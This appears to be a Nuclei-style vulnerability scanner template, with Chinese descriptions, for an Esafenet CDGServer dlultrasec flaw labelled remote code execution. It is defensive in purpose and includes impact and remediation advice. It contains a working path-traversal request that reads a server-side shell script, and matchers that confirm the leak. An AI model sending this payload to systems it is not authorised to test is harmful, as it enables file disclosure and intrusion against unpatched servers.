id: esafenet-cdgserver-dlultrasec-rce
info:
  name: 亿赛通 CDGServer dlultrasec 接口 - 远程代码执行漏洞
  author: Chaitin
  severity: critical
  description: |
    该模板用于检测 亿赛通 CDGServer dlultrasec 接口 - 远程代码执行漏洞。该类漏洞通常允许攻击者通过可控参数、接口调用或危险功能在目标服务端执行命令或代码。模板主要向 `/linuxUpdate/dlUltrasec?path=../../../../../../../../../esafenet/fileServer/fileServer.sh&type=1` 等路径发送探测请求，并根据状态码、响应头、页面关键字或时间差等证据确认漏洞是否存在。
  impact: |
    - 攻击者可在目标服务权限下执行系统命令或应用代码，读取、修改业务数据并部署持久化后门。
    - 若服务运行在高权限账户或可访问内网资源，漏洞可能进一步导致主机失陷和横向移动。
  remediation: |
    - 升级受影响产品到厂商修复版本，或应用官方补丁/安全配置基线。
    - 限制相关管理接口、调试接口或危险功能的访问来源，避免直接暴露到公网。
    - 排查异常进程、计划任务、WebShell、新增账号和外联记录，并轮换可能泄露的密钥与凭据。
  reference:
  - https://stack.chaitin.com/vuldb/detail/5e342f19-6c88-4f8f-8373-8fbc88728e51
  metadata:
    verified: true
    max-request: 1
    vuln-id: CT-1002008
    vendor: esafenet
    product: cdgserver
  tags: rce,vuln,esafenet
http:
- method: GET
  path:
  - '{{BaseURL}}/linuxUpdate/dlUltrasec?path=../../../../../../../../../esafenet/fileServer/fileServer.sh&type=1'
  matchers:
  - type: dsl
    dsl:
    - 'contains(body, ''fileServer.jar'') && contains(body, ''/bin/bash'')'
